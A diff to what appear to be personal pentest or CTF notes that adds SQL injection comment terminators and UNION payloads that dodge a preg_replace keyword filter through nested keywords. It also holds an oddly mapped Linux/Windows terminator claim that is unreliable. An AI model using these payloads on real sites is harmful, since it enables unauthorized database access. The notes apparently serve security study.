@@ -1,5 +1,12 @@
 # Notes
 
+
+### SQL Injection Last Sequence
+```-- ``` -> Linux <br>
+```--+``` -> Windows <br>
+```%23 (#)``` -> Hash 
+
+
 ### Manual UNION SQL Injection
 *Table*
 ```sql
@@ -19,7 +26,12 @@ admin %0A union %0A select %0A 1,database()#
            or
 admin %0A union %0A select %0A database(),2#   
 ```
-
+*Bypass preg_replace*
+```sql
+ununionion select 1,2%23
+     or
+UNunionION SEselectLECT 1,2,3%23
+```
 
 
 ### Known Plaintext ZIP
